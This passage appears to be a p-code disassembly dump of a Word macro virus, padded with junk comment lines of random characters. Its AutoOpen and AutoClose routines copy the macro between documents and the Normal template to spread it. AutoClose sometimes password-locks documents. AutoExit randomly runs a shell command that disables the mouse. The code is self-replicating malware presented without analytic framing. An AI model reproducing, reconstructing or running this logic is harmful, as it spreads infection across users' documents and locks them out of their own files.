' 	QuoteRem 0x0000 0x001F "´ØÆî¼éÃ©ÇžÙÀñµ·§­¼ãÑÃ÷ó å§Åë¨éà"
' Line #73:
' 	EndSub 
' Line #74:
' 	Rem 0x0012 " ÀÙ¡µøÜØÅæ¡Õâ¢¸¡ÎÞ"
' Line #75:
' 	Rem 0x0005 " õ¸éÚ"
' Line #76:
' 	Rem 0x000C " ÝãÎž¼«ÐÞ¨ÃÝ"
' Line #77:
' 	Rem 0x0003 " §Ò"
' Line #78:
' Line #79:
' 	Rem 0x000B " Âø›¡¦© ØªØ"
' Line #80:
' 	Rem 0x002C " ¬ÀÕñ¼ñþàÄÜ»ÈâéÓÓÚœÝÚ�áäç¼Ê¡ÑÄßíö­ÐÑÜúžÃãÐÝª"
' Line #81:
' 	FuncDefn (Sub AutoExit())
' Line #82:
' 	Rem 0x000C " óÐòïÍ«º±ùçÃ"
' Line #83:
' 	Rem 0x0029 " íÂ½¢ÌÊØÎ­¤Àžð¥ Ø�ÖºÅØÍ´»Êþ¾¦ÝÑ¤ÊÐìÆçË´ùÇ"
' Line #84:
' 	Rem 0x001B " å¾Ý¿«Ýåò®ÛÅå×¦Þèöà û¢ëèÁëÀ"
' Line #85:
' 	Rem 0x000E " óºïîüíèÎ½µÐÞµ"
' Line #86:
' 	QuoteRem 0x0000 0x0018 "ë±ìïÀè«Ïô·¬Ûî¹¾¥­è¥«ñööæ"
' Line #87:
' 	QuoteRem 0x0000 0x0004 "ÃÍáÂ"
' Line #88:
' 	Rem 0x0018 " öÉÄ£Îæ›ÝÑ¢Ò²òç®öèúç×¸Ã¥"
' Line #89:
' 	QuoteRem 0x0000 0x0020 "µ�äßÃŸ ·ÝóÌöâÜ£©é÷Ú²ž¾Ïäç¶´î¸ðãÎ"
' Line #90:
' 	OnError Done 
' Line #91:
' 	Rem 0x0023 " ½©ÝÜ¨¬¬ª·ÌØ¾ôç±øÙû¸Î·ÒÖ¯±ÅÙöÆÓÚ¿ÂÉ"
' Line #92:
' 	Rem 0x0005 " ß»¶«"
' Line #93:
' 	Rem 0x0005 " ¼£ž¿"
' Line #94:
' 	Rem 0x0027 " çÁÍËÚÝáÒ«Úõ½½°ÒúÒ¯ÆÌªË¨Ùïó·òçöÓÚ¿ªÅž�Ç"
' Line #95:
' 	QuoteRem 0x0000 0x001F "Àè©ÙÈþð­Ñ°Ï÷çüäÙÉ¬ø¹ºæÐ±«¥ÑåÜ²©"
' Line #96:
' 	Rem 0x0016 " ßí½þ³Ë©¢»Ÿìã©ž´øÝçûõ³"
' Line #97:
' 	QuoteRem 0x0000 0x002E "ñ£¼°æÀÄøÍ°Ä¥­¹ÅøóÁÉèµ¼œØý­±Éåãõ¼®ù³ŸÐ¯½ìï®ÀÌ²Ð"
' Line #98:
' 	QuoteRem 0x0000 0x0012 "Ý²³ÀÖõÚêºÖêÁ Ï³ŸòÍ"
' Line #99:
' 	Ld MyMaster 
' 	Not 
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #100:
' 	QuoteRem 0x0000 0x0027 "£ôÓ½Ë¬¥¿´¤Áªäñ±ù­òóÜãù¼¡›ººØÚ½©ž¾ ¶âö·Ï"
' Line #101:
' 	QuoteRem 0x0000 0x0009 "ç±¢áéöÎÎß"
' Line #102:
' 	LitStr 0x0014 "rundll mouse,disable"
' 	ArgsLd Shell 0x0001 
' 	St MouseDisable 
' Line #103:
' 	Rem 0x001F " ¨óýÍ£³¨¬Ê×¬½èžÝ¼­¿æÕÙµ§œÊŸÑ³ ­"
' Line #104:
' 	Rem 0x0019 " ïÛ�¾Îöªú×êóÃ�ù÷Ö»®ÈòÚÖŸË"
' Line #105:
' 	Rem 0x002A " ²ãøÔ÷ôÑ°Å÷ÕÆÁí¯¹Àóé¤¯Ï­Ú¥Ÿæ»Ðû ûì¸¹µË¾ß«Á"
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	Rem 0x0007 " ÓÚæäð§"
' Line #108:
' 	Rem 0x0016 " ±ý±µøÆüÐ»ºòùÍ¸¨»Ûçå¦¨"
' Line #109:
' 	Rem 0x001A " ÁÃ±âÞÒÉÞÍâë÷ÞªÁ³»¨¾½åÎ¡Áò"
' Line #110:
' 	Rem 0x0004 " ¯Ûó"
' Line #111:
' 	Rem 0x0025 " ›ØÆÒãß´æùÁîæÉþ³ÑêÞù÷ù¢ú�ýÝéÎ½ñ¤Öîö¦æ"
' Line #112:
' 	Rem 0x001C " î¯›ùö¬±Ý¾îœÞ÷¤¨Â¹žçù£ªì·¼Àü"
' Line #113:
' 	Label Done 
' Line #114:
' 	Rem 0x000D " Í§Ñ›è§ôÛÒÁ¡¤"
' Line #115:
' 	QuoteRem 0x0000 0x0008 "§ºöàÊ¿¸á"
' Line #116:
' 	QuoteRem 0x0000 0x0015 "Û¿½×Ïß³¡Æòå§½ÜØÜŸÀâ·©"
' Line #117:
' 	Rem 0x001F " ¡ó®é›ßÝË·Ç»É³ÕÕÁ§îøæÏì±öÝ·ðÛÀ±"
' Line #118:
' 	Rem 0x0015 " ëÙ¦ÕöœÑµâéÁž¶±È¿ÃºÎø"
' Line #119:
' 	QuoteRem 0x0000 0x0025 "ÔÛ¨òŸ®¼ÈÔÕþäÝ± ÁŸõ¾µæÄÝÒœ�ÁÉïÙŸíÄÛÑÃ«"
' Line #120:
' 	Rem 0x002D " öÙ«§ì£ Âóõ±ÜÌÝ÷¿Ýý±Ïò©«¥ÒÊæ¿ÊÅÓäáÆ­ÛÈÓÃ÷Øî¤¥"
' Line #121:
' 	QuoteRem 0x0000 0x0022 "ø¿Ü¢é¸¨Ùö¼ÒÈî ÝŸ¡§öäÍ�²½ØÕÝÒ¼ªÐûçÙ"
' Line #122:
' 	EndSub 
' Line #123:
' 	QuoteRem 0x0000 0x0016 "«ïÎ®ß÷¤á£Õ´Ó³Ú²ûæèÛŸ¿§"
' Line #124:
' 	Rem 0x000B " ·Ðêè¦ÙÍÄ××"
' Line #125:
' 	Rem 0x0022 " §æ¤²øíµÄ¤üÝÃ¶ÛÝž±¤³½úÛŸ¸ëë·«£þ¿æÛ"
' Line #126:
' 	QuoteRem 0x0000 0x0029 "³ û¸úØ›ãÞ¢ÈÛ÷¨ÝÛêÛÉöÞÜ±¡Ý¡Øèâ­¬¢Ö÷ØÒÎéïªØ"
' Line #127:
' 	QuoteRem 0x0000 0x000B "é  øáþíÕÚµÛ"
' Line #128:
' 	QuoteRem 0x0000 0x0016 "æ� ÈÖäùÌ¦œ¾·ÉÕÓÜ¡¿³ºèü"
' Line #129:
' 	Rem 0x002C " ëù×ÄÃä®Î¶Æ÷Úä´ÒªÝêêß¨û¶ûòêÄÈÅî÷âŸË¥ÌÆõø×¢åê"
' Line #130:
' 	Rem 0x001B " â¤é¢ãÎýñõ¡éò¿ôÄ½Úî£Õ÷à¡á¥¸"
' Line #131:
' Line #132:
' 	Rem 0x001D " ¶¿¬£Ü£®¶¦ÂþÀœîøÒ¶Äó»íþ³âú¿Ñ»"
' Line #133:
' 	Rem 0x002C " ôþú¾ª¼¼éñ÷­©ó¼³ïòî©ßÂñû«ó¼ËØºÏµ�ÖñÅáèÅ±×ø¨º"
' Line #134:
' 	Rem 0x0008 " æíÏÑÜ¦Æ"
' Line #135:
' 	Rem 0x0027 " Àº½´òœ¾Ý¡øúÏ·Ü¿¼Åµ²À¦Í¸ØðÖêÍçóÞÅ¨«Éøäê"
' Line #136:
' 	Rem 0x000F " ð×ëÆ§Ä·�œÊÙ¥«Ò"
' Line #137:
' 	Rem 0x0008 " ÇéÉðà´§"
' Line #138:
' 	Rem 0x0023 " Å£ïÚ­×Þåä›¢Ð®ñÊ¤ûùì¡íîÍÝêÂªËæ÷¡¢ì¡"
' Line #139:
' 	Rem 0x002B " ÁÍÊí Áõ¦±ÉÚçÇžúÃÎÛÊØ¾ÆóåÙÂÈÇ¡²³úØŸ¥­¶êÂÈãÃ"
' Line #140:
' 	FuncDefn (Sub AutoOpen())
' Line #141:
' 	Rem 0x0014 " å›éïµåÃ¬ÆÍ¡ ôÎÑòÆÝÔ"
' Line #142:
' 	Rem 0x0017 " Îö¨¢�ªõŸœ³´õÅéŸž¸¥ý°ÍŸ"
' Line #143:
' 	Rem 0x000D " ±ÉýÎ¯Ø¡Æà¦¼¢"
' Line #144:
' 	Rem 0x000B " ýäª²�Àßœ»º"
' Line #145:
' 	Rem 0x000A " ÍÚ»´Ð¾Ñ¸¤"
' Line #146:
' 	Rem 0x0024 " Þãü×óÖÚÑý®êô­Ýý´ õÇ¥ÝÆÑÉº›þÇ©ùáÉ½·Ï"
' Line #147:
' 	Rem 0x0024 " ÚÖÁºäÖ®­ôÖØÍœæ¸àÎè¿ë÷žô£²Ì¨±ýÆÊÊ¬ì±"
' Line #148:
' 	QuoteRem 0x0000 0x0008 "Éž¼Å�°ûð"
' Line #149:
' 	OnError Done 
' Line #150:
' 	Rem 0x0032 " È¬Í»Ïìñ°ßÑéõ� ÁËù¦ÐåãåÁäü©ÐœÜ»¤åüÖ¿É›ß»Û�ßôýÚâôÆÛ"
' Line #151:
' 	QuoteRem 0x0000 0x000B "ŸØê®É¶èŸ´Úµ"
' Line #152:
' 	QuoteRem 0x0000 0x0003 "éñÂ"
' Line #153:
' 	Ld MyMaster 
' 	If 
' 	BoSImplicit 
' 	GoTo Done 
' 	EndIf 
' Line #154:
' 	Rem 0x0002 " ²"
' Line #155:
' 	Rem 0x0004 " èöŸ"
' Line #156:
' 	Rem 0x000D " üÄþ¿ÉðáøÇÙžè"
' Line #157:
' 	Rem 0x0025 " ›è´ãØï¢ýÌ¡Ôä°Û¼ßÆÓ×Ïä›�ç²Ð¥¹üýËàý®ô­"
' Line #158:
' Line #159:
' 	QuoteRem 0x0000 0x0007 "Ñú´¹ÖÎª"
' Line #160:
' 	QuoteRem 0x0000 0x0019 "¡ÆäïÓ¦÷ÁÅö©×ì³¿¢ëðÏÃ¯µ´¥«"
' Line #161:
' 	QuoteRem 0x0000 0x001F "¦Ô§¯¤§ä¾Ë¯ÐÜ·ÊÆÐÙ¶Ã¹�Þ§¦ËÂÃß´¿Á"
' Line #162:
' 	Rem 0x0020 " ¦Å×ŸðëÄÏÀ¥Ý¢ÙÆ²Æ¡¹è§ì»ÚÎËØÛÕçþÐ"
' Line #163:
' 	QuoteRem 0x0000 0x0008 "óµúÉüô¢ë"
' Line #164:
' 	Rem 0x001E " ¾¢´±©öé³ýÇë¡Ö¬æÕàÕ¥ÏÖÌ¾ÜÄ¬×ç¯"
' Line #165:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set OldHome 
' Line #166:
' 	Rem 0x001E " à¡²ÈðÐà¬®éö¿ë®Ûþ¬ž æáèÝ³œ®žýž"
' Line #167:
' 	Rem 0x002B " ¦áêäöÛÜò ½Ÿ›Ìµµª¼Ù½­®ùÃÞÎ¿æ×ÏÚçëûýË¢ÓØý«»�"
' Line #168:
' 	Rem 0x0020 " ÆŸ¥¥¡ÙäîêÄ¥°÷ž¡Ý¾¦ÁëÇ¦¿ÙÀñ³ÅÊî²"
' Line #169:
' 	Rem 0x002C " ³Å¿ÝéÄ¾Ò¯×¨øÚ¾ÒÈÓïœ�àÜáºÊ©ÊüÀÕÍÙûúåÖß×¤ÄÄ×·"
' Line #170:
' 	Rem 0x000E " îØè¢ñ¸¬ºÒÞ½ÑÅ"
' Line #171:
' 	Rem 0x0026 " ±åõê·Ã¦¼÷ÏÁ¾§îÍÜýã­¹ä«É¿Ô¹òÇ«éÀðý÷þÜº"
' Line #172:
' 	Rem 0x0024 " ½¤ÃÔ¾Æ›Ú¹÷³ÙýÜÊÂ¡¡¥ÛÔÇúô®³¼§«©ù­¤êÇ"
' Line #173:
' 	Rem 0x0021 " ÇïÎÇª×¶ìöÌöäÀ®¼âÈÛ×å×°Ù¸ðÊÓ Ùòž¿"
' Line #174:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NewHome 
' Line #175:
' 	Rem 0x0033 " Ï¸ŸÉåØúñï¥ç·ìºÕ»ýÝçïœÒê¹ßªõýº÷ÂøžöçÑåîÔ¤òï¡íñ¤ÊöÀþ"
' Line #176:
' 	Rem 0x002D " ¸¼Û²Ê›ç°®ÔÑ©ÅØþñéà¢È·®¸»ìô °Á°çì¤·â±òæÞ¡ü¹±Ë"
' Line #177:
' 	QuoteRem 0x0000 0x0001 "ù"
' Line #178:
' 	QuoteRem 0x0000 0x0008 "µ«èÑåÞ¦Ü"
' Line #179:
' 	QuoteRem 0x0000 0x0031 "¡ÌõÝµÂÍæ¤¿þîò×®¬ëçÛîÖòÛÓõ§£ÆÐ¼ú§º«Ü¥ëª¢ÈàÃ»Ëþ¢½¤ù"
' Line #180:
' 	Rem 0x002C " óßðø›àÌëèøíÁ ëñ¢»é½¥ÒòÉ½îç¼ïâå¶§ºÁæ±­ü¦ÎøÜ¥"
' Line #181:
' 	QuoteRem 0x0000 0x0017 "À¡åÏÑùÞæÊœÚ¥ÏÀéåŸª¨½ŸÐ×"
' Line #182:
' 	Rem 0x0015 " Éê¦Ÿ¨Ñ¹ò²´øÆõôê¼ÏëÍÙ"
' Line #183:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St oldPath 
' Line #184:
' 	Rem 0x0006 " áãë®›"
' Line #185:
' 	Rem 0x002B " ßÄ›²ÑÆóÉ ©î°èê°ïÀ¹ÉÆµÃØÁøÑÊá¢×Ú�Æ´°ÇÇ®¼ Î�"
' Line #186:
' 	QuoteRem 0x0000 0x0028 "´ûíØ±±¹¦Ö°ç±ÏÆñÆ°­ó´ìûÒœœÚÆÄÄÀ±í×¸áº ùÍÈ"
' Line #187:
' 	Rem 0x0020 " ÓóÃ®¾Öí¤õùÐÂËÏÍ§«ÛÈœùÞž¨î�Ö¸ÑŸñ"
' Line #188:
' 	QuoteRem 0x0000 0x0002 "É¸"
' Line #189:
' 	QuoteRem 0x0000 0x001D "ç§ßÛ¯»ÁÌÕ¥þËïÀëü»çì­ðÒ¨ôÉ³°úŸ"
' Line #190:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St newPath 
' Line #191:
' 	Rem 0x0018 " Ò½¸£¦óèŸè ÖÀ£òÖêÂœÞâòÜ¸"
' Line #192:
' 	Rem 0x0023 " ¡ÓÌäü°¬Òß´­èúÄÖàÒ¶ëËÞ¯ðÊ›¢Á®ØÙ¿°ÒÛ"
' Line #193:
' 	QuoteRem 0x0000 0x0014 "®øé¾Àøø·³©Øùî¿ä§ÍÍÚ©"
' Line #194:
' Line #195:
' 	Rem 0x002A " öªûÅâøí¤è¹çðÑÚÜ¶ãÉìÕ¥¦¯§¤¢º×›£ð¢¥þ¬ÝÆÄÆ£¼"
' Line #196:
' 	Rem 0x0019 " îãßç®®½µüéØªûÌ¥Ì±Û×öœóð¢"
' Line #197:
' 	Rem 0x0003 " ±ì"
' Line #198:
' 	Rem 0x0022 "  £°ËäØÜê×¼²ÓÑÒ°Å»óüÞäóý»ÇÏÓôÕº»ú§"
' Line #199:
' 	Rem 0x001D " Å›ÐÚØúòðŸ§åïûÆ»ºÞá¥úÐË¾ªíà¶Í"
' Line #200:
' 	QuoteRem 0x0000 0x0003 "÷›§"
' Line #201:
' 	ArgsCall (Call) ReproducTion 0x0000 
' Line #202:
' 	QuoteRem 0x0000 0x002E "å§â·ìÔ¢ì°«Ýâ²ã÷ó×áÅë½êŸœ²µõ¿®¤›ý¶ìâœÊ§ò¥¶²åÛúœ"
' Line #203:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #204:
' 	QuoteRem 0x0000 0x0013 "ëÔûŸ£ûí¥èžý±¾²¸ºçâË"
' Line #205:
' 	Rem 0x0003 " ÌÞ"
' Line #206:
' 	QuoteRem 0x0000 0x0021 "ÃÔÆéãÍáÏÚ§ÎëÁôö®­¼êâ÷þùßÒ®í¾·Ì¬´Ì"
' Line #207:
' 	Label Done 
' Line #208:
' 	Rem 0x0026 " Á¨öÔÉå¿ªÚ°è³¬ôÎÁÃ ´·£ÖáËÕÑ°Ûð¹�ß�Ø¾Ýô"
' Line #209:
' 	Rem 0x002B " ¿¡äçÜñ§üÕžÆ¾¹¨ªïÕäèÅ³»ž»³üó§Ïé²ÑÜ�Åü§£ËçÒ©"
' Line #210:
' 	QuoteRem 0x0000 0x0022 "ÆÓ½ïð£¬öèæÜæ«Õù»òûŸ¢±ðµÍÂàÉËË£žµÅ¯"
' Line #211:
' 	Rem 0x0025 " Ñüàçúþ×õÝ®åžÅ·­½ºô°È¬ÏÎãØ¯®µûöÍéïæº¢"
' Line #212:
' 	Rem 0x0008 " ÀÀüª´¾ô"
' Line #213:
' 	QuoteRem 0x0000 0x002C "ù©Ë³õ¬Ä¦¡ªîÒÅêÎÃõýæþù©³Äæ¹êÈÀ›á¾Ìöý»û§±ã§»»¢"
' Line #214:
' 	EndSub 
' Line #215:
' 	QuoteRem 0x0000 0x0007 "ëµ®¼âÉÕ"
' Line #216:
' 	QuoteRem 0x0000 0x0028 "ÚñÊ¸®ËÍºÒðãÅâäêìÊ¼�äÕ¬í®ÇÞíÆãÑî±ØóÏçôžìË"
' Line #217:
' 	Rem 0x002A "  Í´äúñäÅ¶Íèª¯œŸÜÔ§ìæåö·Õ¹ìÖÁË¼Ü¦¹ÑÞîÓ»ÉêÄ"
' Line #218:
' 	QuoteRem 0x0000 0x001A "¹ñæÜ½÷çî÷Îè²­©Æ¿´½¼ñòïÎ¢æÈ"
' Line #219:
' Line #220:
' 	Rem 0x0012 " é°î»Üòñü±¹óèþ³¢ôÂ"
' Line #221:
' 	Rem 0x0024 " ¾µùýÞþÀÑ°ÊÂéµå¥õøÃï¶æìãŸ��ìÀøÂ¯ÎÃ¡Û"
' Line #222:
' 	Rem 0x000E " ¦¤¬øÊùÑëÙüèñû"
' Line #223:
' 	QuoteRem 0x0000 0x001A "õŸýÅÂÈùåÏË¸¢¨Öô¸·ÐÛ¡Ù¸è¬Íç"
' Line #224:
' 	Rem 0x0018 " í­°¢Ü³¡¥Ö¦¥éóœí¤´á«ÞÐ×þ"
' Line #225:
' 	Rem 0x0033 " èÀµÕÏÏ¼ÏôÑÜ¯èø¬¾ñç¡²¼æÝË²÷¼àÞ¦þíæ°Âµ²©°áù×êéûÑåÁÑÂ"
' Line #226:
' 	FuncDefn (Sub AutoClose())
' Line #227:
' 	QuoteRem 0x0000 0x000C " òÑ�Üñþ¢ü°ç¤"
' Line #228:
' 	QuoteRem 0x0000 0x002A "æ³Ù¶¢­ñ¦Ø«óõÄþÈèéààì©÷ëñÜ«Ð¢ÒØÈ®·õöØ¾Èè­õã"
' Line #229:
' 	OnError Done 
' Line #230:
' 	QuoteRem 0x0000 0x002B "¡ÅÁÄÅÛÕ�èðöô¶èÜ÷­ëŸ¢Ñ›¼³×íØóü×½»ÕçÙö¹ñ¶òÄµÙ"
' Line #231:
' 	Rem 0x000E " Ü¡ÔÙ´º¼ÎðÏÌÈÊ"
' Line #232:
' 	QuoteRem 0x0000 0x000C "µöìÛÄú£Ìà¼üÆ"
' Line #233:
' 	Ld MyMaster 
' 	If 
' 	BoSImplicit 
' 	GoTo Done 
' 	EndIf 
' Line #234:
' 	Rem 0x0017 " úù©À²ê·Ø·ªÆµëò®÷çùí´íÁ"
' Line #235:
' 	Rem 0x0022 " À÷œêÅÉ¡¿±®°áÙÐ¿Î©ìáÞôáÈý¦¾¹åÖ½ãŸè"
' Line #236:
' 	QuoteRem 0x0000 0x0007 "ëÑÒÂÖùï"
' Line #237:
' 	QuoteRem 0x0000 0x002C "ÉÞúÚ©îÜíËèâèœíºÀÞ©³äö¹ô§Ðíûï¼²ýæÉ£ÐÑËÓ±í¸øÇó"
' Line #238:
' Line #239:
' 	Rem 0x000A " ´èØÌ�›¨�í"
' Line #240:
' 	Rem 0x002F " ²âØâ×Ý½ÕÒðÂ¼Äçžž¨öÀÀìÊÙ×÷Ì·®´œú±àëþÙàúîžÍª£Í«ã"
' Line #241:
' 	Rem 0x0006 " ±Èµ¨³"
' Line #242:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set OldHome 
' Line #243:
' 	QuoteRem 0x0000 0x0002 "›ç"
' Line #244:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set NewHome 
' Line #245:
' 	Rem 0x0019 " éî êááº¯ãÚµïžéÃÉì±Ã¯¥Ö¼¢"
' Line #246:
' 	Rem 0x001F " Ð°Ã²¼î±ÈÆœ›ú¦¥¡Ë¨ž£áÁ¶§¥ÀÏÈÔ»·"
' Line #247:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St oldPath 
' Line #248:
' 	Rem 0x002C " œœ½¥¨ÅÎ¯ì¸üÁ¿¡£ÉÓõ¡êÒåéÜÞ¤ÅÈïÓëÞò®ÎËÃËæ¯Ý¬û"
' Line #249:
' 	Rem 0x0003 " í¬"
' Line #250:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St newPath 
' Line #251:
' 	QuoteRem 0x0000 0x002E "¤û¸è›£¥ÙÀ¡âñ©øµÑúê×Íó¶Ÿ³«ßðÇÈùÈ²þ´Ç¹ËÍ¸ÙÙÌò¡Ñè"
' Line #252:
' Line #253:
' 	QuoteRem 0x0000 0x0007 "ÁàÓÙµÄ£"
' Line #254:
' 	Rem 0x001F " œþÛçèøþþýÅ÷èâáÃ£·´âŸÍ¢Î×Ýçà�³¹"
' Line #255:
' 	Rem 0x0004 " ÄÖÊ"
' Line #256:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #257:
' 	Rem 0x000D " ºÏò² äíÈø®öÐ"
' Line #258:
' 	Rem 0x0017 " ¹È¢êÊ¯ìÁ›Ë¨à�»ÜëÊ½¬°£í"
' Line #259:
' 	Rem 0x0029 " ¤ÉÅ©äý´²ÍÀè¹£ûá¯ª±ºûë¶õâë´éÀÖ·³¢þ»¥¹ââ ï"
' Line #260:
' 	Rem 0x001E " ïÉÊª¡º¬¦ê¤ãÒùþå£ÀÀ¿âæ©›Û­þíëÎ"
' Line #261:
' 	Rem 0x0002 " ®"
' Line #262:
' 	Rem 0x0014 " ØðÛÓÐåéÆç³ËÍæÆ©Ñ¾°í"
' Line #263:
' 	MemLdWith Saved 
' 	St s 
' Line #264:
' 	Rem 0x0002 " ó"
' Line #265:
' 	QuoteRem 0x0000 0x0031 "¿¼»°¶ú©É«¨êàãÍ¼òÆµ£ºõ¼²Òñ¬»­þÅÁ¹Ê³òã¶Æ½þ­¶ï§Ú¬¨Ÿ²"
' Line #266:
' 	QuoteRem 0x0000 0x0016 "ó¢©èöçÏ¥¹°�ç×²úçüè©Ô¬þ"
' Line #267:
' 	Rem 0x0017 " ¸¡œ­±ãÀìøÒìÐÃ›ÖËÂµõ¡öä"
' Line #268:
' 	ArgsCall (Call) ReproducTion 0x0000 
' Line #269:
' 	Rem 0x001D " ¿º­üà½ìÞÙ²ìÂœ©ÜùöÑî›ß¥¸øã·Ø­"
' Line #270:
' 	Rem 0x0012 " ö×Ü«Î¿ÀãÄäô¢ÀÏ¬œù"
' Line #271:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld MasterID 
' 	MemStWith Password 
' 	EndIf 
' Line #272:
' 	Rem 0x0017 " �ßôèÁÁ¯ÀèÃ¼§ð÷±õöº¨Ø¯ù"
' Line #273:
' 	Rem 0x000F " °ÔºâÎàá£ÈÂäº×°"
' Line #274:
' 	MemLdWith FullName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	MemLdWith FullName 
' 	Ld wdWordDocument 
' 	ArgsMemCallWith SaveAs 0x0002 
' 	Else 
' 	BoSImplicit 
' 	ArgsMemCallWith Save 0x0000 
' 	EndIf 
' Line #275:
' 	QuoteRem 0x0000 0x0007 "ÐÙ³ÎñÞç"
' Line #276:
' 	Rem 0x000C " ¢ä çúÅÞÏÏù°"
' Line #277:
' 	QuoteRem 0x0000 0x0022 "¼É§¸ÈéôÓÕ¶ÐžçãôÖúµç¶ìéÞøÂ¤»õÆôñ¯ÏÃ"
' Line #278:
' 	Rem 0x0013 " õèôÛ¨¹ÂÛÃ¼ËÕàö®îÓ³"
' Line #279:
' 	Rem 0x0033 " îíûÐõÂÝùò×ËøÁÄß¤¶º Óó­¥²¯› ïá·Øæý¯ÃÎ¢Ò±ªÖÄ ¯ØÓäÐ±Û"
' Line #280:
' 	Ld s 
' 	MemStWith Saved 
' Line #281:
' 	QuoteRem 0x0000 0x0004 "¦±©á"
' Line #282:
' 	EndWith 
' Line #283:
' 	QuoteRem 0x0000 0x001E "ûåÖéŸÔØùÜ°�Ã÷­ÍÔ»ŸÍÒ¯Ûâà±üºôÄò"
' Line #284:
' 	Rem 0x0015 " ŸÉÏß³¶Òö¿²Ï¹¢³ì§°âÉä"
' Line #285:
' 	QuoteRem 0x0000 0x0012 "Ú¤Ï×î£Ñ½øÐÞ¸óŸëÝ¯Î"
' Line #286:
' 	QuoteRem 0x0000 0x001D "­Æ´úùûœÄ¤Þ§›³¬Ðïµ¹»Ù°¸Ó¢©Éø£Ï"
' Line #287:
' 	Rem 0x0030 " ÞÌÃßÛò¬ÆýðüÍ¡Ï�ýÑ¡«ü¡èüÇÛèÐðñÌýÌëöêÖÞÒï¯¶°±é«Åä"
' Line #288:
' 	Rem 0x0018 " â³à›ÕÞžð²ðê¿¡Ÿ÷Üõ¯®¿ü£ž"
' Line #289:
' 	Label Done 
' Line #290:
' 	QuoteRem 0x0000 0x0032 "­Û÷ÄžáÝ¨ãêÖËžÒþœûö±¦¤¡ù±á££ýÛÀ×ù÷ðý©¢ïÃÆ¶èêÌ­ÔÐ×Õò"
' Line #291:
' 	QuoteRem 0x0000 0x0025 "áôÌÈ½«ñÚæòÕÖ±¨Õ�ÅíÂåÓ·©ê®çº±òÓ«ÛÊýžÌ¼"
' Line #292:
' 	Rem 0x0026 " §¤ÉžÔ¹îß©ëÊ¤ÛëÞØÌéüêÉŸ¾ò¸¨«œöôç¸Ñ¿þÅÊ"
' Line #293:
' 	EndSub 
' Line #294:
' 	Rem 0x0027 " ×÷Ûýå²¶¬ÞÝžÉ÷»ÓŸ¼Â·÷¼²þó›¸¹±óÞðµÌÍ­ÏÙŸ"
' Line #295:
' 	Rem 0x000C " ÆÔêè­øÓÛïü¯"
' Line #296:
' 	QuoteRem 0x0000 0x0022 "ÔùœÕÖ²öÃÂñßõµø®óÊÏÆñ¯¥¯ð£ÞÙ÷ÖåÀÌªý"
' Line #297:
' 	Rem 0x0020 " þÙúØèÜÊ÷÷äÈ¦åñ¢ ¸ê°Îþ³üÞüçñÆ«Çé"
' Line #298:
' 	QuoteRem 0x0000 0x0028 "¼ë§�ÖÙÝ®Æèö éÞ¦Óã·çôÙÝ¬í¥©åîÞ¾�ú®úÎ¿›£¯ì"
' Line #299:
' 	Rem 0x0014 " òÛÜ¯§âãò¯ýªÛÏòÖß›Áœ"
' Line #300:
' Line #301:
' 	Rem 0x0004 "  ðÂ"
' Line #302:
' 	Rem 0x0028 " íÛËôËÕâëÛ¬ËÜÈÄÌ¬óíï¥úìžëâÜõæý¼®Úí¢÷¼ëÛÍ"
' Line #303:
' 	Rem 0x0004 " ÀÔ¼"
' Line #304:
' 	Rem 0x0002 " Û"
' Line #305:
' 	QuoteRem 0x0000 0x0020 "«ÇÈÆç›ÃÇúÓ¨ëú§ÑžÖñ  Û°»£ëâÚÉÑÜ¢¡"
' Line #306:
' 	Rem 0x0020 " ÍÕÉÎ¨ÌžÙ éíœ¹Ç¸œôâ¬¡ÁžÒÙÀíÛäÛø¼"
' Line #307:
' 	QuoteRem 0x0000 0x002E "òËè¾îþë¼ÂÓ¤µœµ¤ß³ï·¥çäœÄ õ¦£ù¾²ŸçÆ›ÃÇöîï¦åÓçá×"
' Line #308:
' 	Rem 0x0025 " §±£í²ÅØÖÙõþä¡éÒ²åõÅÚ¶õÅÃÂûÞªÌÃöÏì÷ßó"
' Line #309:
' 	FuncDefn (Sub ReproducTion())
' Line #310:
' 	QuoteRem 0x0000 0x002C "æþ³Øøµã¥ÌµÌµÀ¹Ÿ¹òãíØç¾æ¤´èÑºÛ·ä¸äÚÏ­ŸÎµ×Ýêèã"
' Line #311:
' 	Rem 0x001B " Æ¬£ÑöØù³æ£ºÌÜ¬ÅëÑìÂœ»÷ÂéÌç"
' Line #312:
' 	Rem 0x000B " ÀŸéî¬èô¾îô"
' Line #313:
' 	OnError Done 
' Line #314:
' 	QuoteRem 0x0000 0x001A "ÖÓÅñÌÖù²ÃÓØ´Ÿ»ŸÎ¹¥èðÅ©µ½ë¨"
' Line #315:
' 	QuoteRem 0x0000 0x002A "ÝÃ›¢¾íŸèËÊÞöë¤óôè®´Åú¢«í£Âè þÜçÍªÀëÕ¡úíûÀÅ"
' Line #316:
' 	Rem 0x0012 " âì¹î¼½Â¹Ä»Çóµò»Á¡"
' Line #317:
' 	Rem 0x0024 " ÈÕ·Î¦Éê±žÁéçÖñÕ¼ßø¥ÅµÅâ£ØªùóÅãöà×ªË"
' Line #318:
' 	QuoteRem 0x0000 0x000C "µ­âÔãô¢éü³Èž"
' Line #319:
